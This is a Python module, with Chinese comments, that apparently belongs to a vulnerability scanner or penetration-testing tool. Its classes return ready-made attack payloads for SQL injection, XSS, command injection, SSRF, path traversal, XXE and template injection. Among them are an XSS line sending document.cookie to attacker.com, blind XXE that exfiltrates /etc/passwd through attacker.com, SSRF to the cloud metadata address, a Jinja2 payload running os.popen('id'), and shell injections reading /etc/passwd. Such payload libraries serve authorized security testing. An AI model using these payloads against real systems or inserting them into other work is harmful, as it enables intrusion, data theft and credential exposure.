"""
Payload 生成器
==============
各类漏洞的 PoC Payload 自动生成

支持:
- SQL Injection
- XSS
- Command Injection
- SSRF
- XXE
- Path Traversal
"""

from __future__ import annotations

import random
import string
from abc import ABC, abstractmethod
from typing import Optional


class PayloadGenerator(ABC):
    """Payload 生成器基类"""

    def __init__(self):
        self.name = self.__class__.__name__

    @abstractmethod
    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成 payload"""
        pass

    def generate_batch(self, count: int = 5, target: str = "", context: Optional[dict] = None) -> list[str]:
        """批量生成"""
        return [self.generate(target=target, context=context) for _ in range(count)]


class SQLiPayloadGenerator(PayloadGenerator):
    """SQL 注入 Payload 生成器"""

    # Boolean-based blind
    BLIND_PAYLOADS = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "admin'--",
        "admin' OR '1'='1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT 1,2,3--",
    ]

    # Time-based blind
    TIME_PAYLOADS = [
        "' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR (SELECT * FROM (SELECT SLEEP(5))a)--",
        "1; SELECT pg_sleep(5)--",
        "1' OR (SELECT COUNT(*) FROM generate_series(1,5000000))>0--",
    ]

    # Error-based
    ERROR_PAYLOADS = [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "' UNION SELECT 1,2,3 FROM (SELECT CAST(VERSION() AS VARCHAR(100)))a--",
    ]

    # Union-based
    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    ]

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成 SQLi payload"""
        vuln_type = context.get("vuln_type", "blind") if context else "blind"

        if vuln_type == "time":
            return random.choice(self.TIME_PAYLOADS)
        elif vuln_type == "error":
            return random.choice(self.ERROR_PAYLOADS)
        elif vuln_type == "union":
            return random.choice(self.UNION_PAYLOADS)
        else:
            return random.choice(self.BLIND_PAYLOADS)


class XSSPayloadGenerator(PayloadGenerator):
    """XSS Payload 生成器"""

    # 反射型 XSS
    REFLECTED_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<meter onmouseover=alert(1)>0</meter>",
        "<object data=javascript:alert(1)>",
    ]

    # 存储型 XSS
    STORED_PAYLOADS = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=this.src='https://attacker.com/?c='+document.cookie>",
        "<svg><script>alert(1)</script></svg>",
        "<body><img src=x onerror=eval(atob('YWxlcnQoMSk='))></body>",
    ]

    # DOM XSS
    DOM_PAYLOADS = [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "<img src=x onerror=location='javascript:alert(1)'>",
    ]

    # 编码绕过
    ENCODED_PAYLOADS = [
        "<script>alert&#40;1&#41;</script>",
        "<script>alert&#40;1&#41;",  # HTML 实体
        "%3Cscript%3Ealert(1)%3C/script%3E",  # URL 编码
        "<scr\x00ipt>alert(1)</scr\x00ipt>",
        "<ScRiPt>alert(1)</sCrIpT>",  # 大小写混合
    ]

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成 XSS payload"""
        xss_type = context.get("xss_type", "reflected") if context else "reflected"

        if xss_type == "stored":
            return random.choice(self.STORED_PAYLOADS)
        elif xss_type == "dom":
            return random.choice(self.DOM_PAYLOADS)
        elif xss_type == "encoded":
            return random.choice(self.ENCODED_PAYLOADS)
        else:
            return random.choice(self.REFLECTED_PAYLOADS)


class CmdInjectionPayloadGenerator(PayloadGenerator):
    """命令注入 Payload 生成器"""

    PAYLOADS = {
        "linux": [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; whoami",
            "| whoami",
            "&& whoami",
            "|| whoami",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "; id",
            "| id",
            "$(id)",
        ],
        "windows": [
            "; dir",
            "| dir",
            "& dir",
            "&& dir",
            "; type C:\\Windows\\win.ini",
            "| type C:\\Windows\\win.ini",
            "& type C:\\Windows\\win.ini",
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "; ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ],
        "generic": [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "; sleep 3",
            "&& sleep 3",
            "; id",
            "$(id)",
        ],
    }

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成命令注入 payload"""
        os_type = context.get("os_type", "generic") if context else "generic"
        payloads = self.PAYLOADS.get(os_type, self.PAYLOADS["generic"])
        return random.choice(payloads)


class SSRFGenerator(PayloadGenerator):
    """SSRF Payload 生成器"""

    PAYLOADS = [
        # 本地地址
        "http://127.0.0.1",
        "http://localhost",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://0.0.0.0",
        "http://0.0.0.0:80",
        # 元地址
        "http://[::1]",
        "http://[::1]:80",
        # AWS 元数据
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        # 文件读取
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        # 协议升级
        "dict://127.0.0.1:11211/stats",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成 SSRF payload"""
        return random.choice(self.PAYLOADS)


class PathTraversalGenerator(PayloadGenerator):
    """路径遍历 Payload 生成器"""

    PAYLOADS = {
        "linux": [
            "../../../../etc/passwd",
            "../../../../etc/passwd%00",
            "....//....//....//....//etc/passwd",
            "..%252f..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
            "../../../../../../etc/passwd",
            "........../etc/passwd",
        ],
        "windows": [
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\win.ini",
            "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini",
            "..%252f..%252f..%252f..%252fwindows\\win.ini",
            "..%5C..%5C..%5C..%5Cwindows\\win.ini",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        ],
        "generic": [
            "../../../../etc/passwd",
            "../../../../windows/win.ini",
            "....//....//....//....//etc/passwd",
            "..%252f..%252f..%252f..%252fetc/passwd",
        ],
    }

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成路径遍历 payload"""
        os_type = context.get("os_type", "generic") if context else "generic"
        payloads = self.PAYLOADS.get(os_type, self.PAYLOADS["generic"])
        return random.choice(payloads)


class XXEGenerator(PayloadGenerator):
    """XXE Payload 生成器"""

    PAYLOADS = [
        # 基础 XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        # XXE 读取文件
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        # 参数实体
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>',
        # Blind XXE (外带)
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
        # XXE + SSRF
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        # 无回显 XXE
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?p=%xxe;\'>"><!ENTITY &#x25; exfil "%eval;">%exfil;]>',
    ]

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成 XXE payload"""
        return random.choice(self.PAYLOADS)


class SSTIGenerator(PayloadGenerator):
    """SSTI (模板注入) Payload 生成器"""

    PAYLOADS = {
        "jinja2": [
            "{{ config.items() }}",
            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            "{{ ''.__class__.__mro__[2].__subclasses__() }}",
            "{% for c in [] %}{{ cycle([1,2,3], 0) }}{% endfor %}",
        ],
        "twig": [
            "{{ _self.env.display('{{7*7}}') }}",
            "{{ dump(app) }}",
            "{{ [1,2,3]|map('double')|join(',') }}",
        ],
        "freemarker": [
            "${Application?error_info}",
            "${.data_model?keys}",
        ],
        "velocity": [
            "#set($e=$exp.HTML($exp.getClass()))",
            "#set($r=$exp.eval('$request'))",
        ],
        "generic": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "<%= 7*7 %>",
            "{{1+1}}",
        ],
    }

    def generate(self, target: str = "", context: Optional[dict] = None) -> str:
        """生成 SSTI payload"""
        template_engine = context.get("template_engine", "generic") if context else "generic"
        payloads = self.PAYLOADS.get(template_engine, self.PAYLOADS["generic"])
        return random.choice(payloads)


# ============================================================
# 工厂函数
# ============================================================

def get_generator(vuln_type: str) -> PayloadGenerator:
    """
    根据漏洞类型获取对应的生成器

    Args:
        vuln_type: 漏洞类型 (sql_injection, xss, command_injection, ssrf, etc.)

    Returns:
        PayloadGenerator 实例
    """
    generators = {
        "sql_injection": SQLiPayloadGenerator,
        "sqli": SQLiPayloadGenerator,
        "xss": XSSPayloadGenerator,
        "command_injection": CmdInjectionPayloadGenerator,
        "cmd_injection": CmdInjectionPayloadGenerator,
        "ssrf": SSRFGenerator,
        "path_traversal": PathTraversalGenerator,
        "lfi": PathTraversalGenerator,
        "rfi": PathTraversalGenerator,
        "xxe": XXEGenerator,
        "ssti": SSTIGenerator,
        "template_injection": SSTIGenerator,
    }

    generator_class = generators.get(vuln_type.lower())
    if generator_class:
        return generator_class()
    raise ValueError(f"Unknown vulnerability type: {vuln_type}. "
                     f"Supported: {', '.join(generators.keys())}")
